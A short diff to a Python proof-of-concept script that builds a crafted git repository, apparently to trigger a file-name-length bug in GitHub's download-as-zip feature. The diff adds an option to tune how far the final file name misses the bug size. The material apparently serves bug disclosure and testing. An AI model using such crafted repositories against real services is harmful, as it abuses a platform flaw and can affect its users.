@@ -14,6 +14,8 @@ def main():
         "Push to github and print the download-as-zip link.")
     group.add_argument("--output", help=
         "Path to write the zip archive from `git archive`.")
+    parser.add_argument("--adjust", type=int, default=0, help=
+        "Instead of hitting the bug size exactly, miss it by the specified amount.")
     args = parser.parse_args()
 
     if args.push:
@@ -67,7 +69,7 @@ def main():
         for i in range(64)
     ] + [
         # Last file name's length hits it spot on:
-        "100644 blob {}\t{}.txt\x00".format(empty_file_hash, "c"*31)
+        "100644 blob {}\t{}.txt\x00".format(empty_file_hash, "c"*(31 + args.adjust))
     ]).encode("utf8"))
 
     commit_hash = git("commit-tree", "-m", "poc malicious github repo demonstrating download-as-zip exploit", tree_hash)
